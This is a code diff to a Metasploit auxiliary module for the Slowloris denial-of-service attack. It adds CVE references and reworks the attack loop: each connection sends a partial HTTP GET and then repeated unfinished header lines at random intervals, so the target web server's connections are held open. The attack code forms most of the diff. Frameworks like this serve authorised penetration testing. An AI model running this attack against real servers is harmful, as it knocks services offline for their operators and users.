@@ -13,7 +13,7 @@ class MetasploitModule < Msf::Auxiliary
       'Name'            => 'Slow Loris DoS',
       'Description'     => %q{Slowloris tries to keep many connections to the target web server open and hold them open as long as possible. 
                               It accomplishes this by opening connections to the target web server and sending a partial request. 
-                              Periodically, it will send subsequent requests, adding to—but never completing—the request.},
+                              Periodically, it will send subsequent requests, adding to but never completing the request.},
       'License'         => MSF_LICENSE,
       'Author'          =>
         [
@@ -22,7 +22,9 @@ class MetasploitModule < Msf::Auxiliary
         ],
       'References'      =>
         [
-          ['URL', 'https://www.exploit-db.com/exploits/8976/']
+          [ 'CVE', '2007-6750' ],
+          [ 'CVE', '2010-2227' ],
+          [ 'URL', 'https://www.exploit-db.com/exploits/8976/' ]
         ],
     ))
 
@@ -56,9 +58,11 @@ class MetasploitModule < Msf::Auxiliary
               connect()
               header = "GET / HTTP/1.1\r\n"
               sock.puts(header)
-              sleep rand(1..15)
-              data = "X-a-#{rand(0..1000)}: b\r\n"
-              sock.puts(data)
+              10.times do
+                data = "X-a-#{rand(0..1000)}: b\r\n"
+                sock.puts(data)
+                sleep rand(1..15)
+              end
             end
           end
         end
